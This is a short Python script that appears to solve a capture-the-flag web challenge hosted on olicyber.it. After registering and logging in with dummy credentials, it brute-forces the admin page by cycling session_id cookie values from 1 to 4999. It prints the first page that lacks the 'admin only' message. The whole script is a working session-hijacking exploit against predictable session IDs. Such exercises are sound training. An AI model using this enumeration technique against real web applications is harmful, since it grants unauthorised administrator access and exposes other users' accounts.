import requests
from tqdm import tqdm


data = {
    'username': 'asdasd',
    'password': 'asdasd'
}

def register():
    r = requests.post("http://too-small-reminder.challs.olicyber.it/register", json=data)

    print(r.text)

def login():
    req = requests.post("http://too-small-reminder.challs.olicyber.it/login", json=data)
    print(req.text)
    print(req.cookies.get_dict())


def admin():
    for i in tqdm(range(1, 5000)):
        r = requests.get("http://too-small-reminder.challs.olicyber.it/admin", cookies={'session_id': str(i)})
        if not "riservata all'admin!" in r.text:
            print(r.text)
            exit(0)


admin()